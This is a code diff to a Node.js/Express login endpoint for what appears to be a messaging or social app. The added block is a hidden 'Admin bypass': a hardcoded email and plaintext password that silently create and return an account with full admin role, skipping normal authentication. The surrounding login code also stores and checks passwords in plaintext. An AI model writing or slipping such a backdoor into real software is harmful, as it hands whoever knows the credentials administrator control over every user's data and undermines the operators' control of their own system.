@@ -101,6 +101,26 @@ app.post('/api/login', async (req, res) => {
     return res.status(400).json({ error: 'Email and password required' });
   }
   try {
+    // Admin bypass
+    if (email === 'bitbyte790@gmail.com' && password === 'zionent') {
+      let adminUser = await db.get('SELECT * FROM profile WHERE email = ?', [email]);
+      if (!adminUser) {
+        // Create admin user if not exists
+        const adminId = `admin-${Date.now()}`;
+        await db.run(
+          "INSERT INTO profile (id, name, phone, email, password, bio, avatar, role, accountStatus, settings_json, accountType, ip) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+          [adminId, 'Admin', '', email, password, 'System Administrator', `https://api.dicebear.com/7.x/avataaars/svg?seed=admin`, 'admin', 'active', JSON.stringify({ theme: 'dark', wallpaper: '', vibrations: true, notifications: true, fontSize: 'medium', brightness: 'dim', customThemeColor: '#00a884' }), 'admin', req.ip || req.connection.remoteAddress]
+        );
+        // Add to directory
+        await db.run(
+          "INSERT INTO directory_users (id, name, bio, avatar, tags, accountStatus, statusBadge, email, phone, status, accountType) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+          [adminId, 'Admin', 'System Administrator', `https://api.dicebear.com/7.x/avataaars/svg?seed=admin`, 'Admin, System', 'active', 'Admin', email, '', 'offline', 'admin']
+        );
+        adminUser = { id: adminId, name: 'Admin', phone: '', email, password, bio: 'System Administrator', avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=admin`, role: 'admin', accountStatus: 'active', settings_json: JSON.stringify({ theme: 'dark', wallpaper: '', vibrations: true, notifications: true, fontSize: 'medium', brightness: 'dim', customThemeColor: '#00a884' }), accountType: 'admin', ip: req.ip || req.connection.remoteAddress };
+      }
+      return res.json(adminUser);
+    }
+
     const user = await db.get('SELECT * FROM profile WHERE email = ?', [email]);
     if (user && user.password === password) {
       res.json(user);
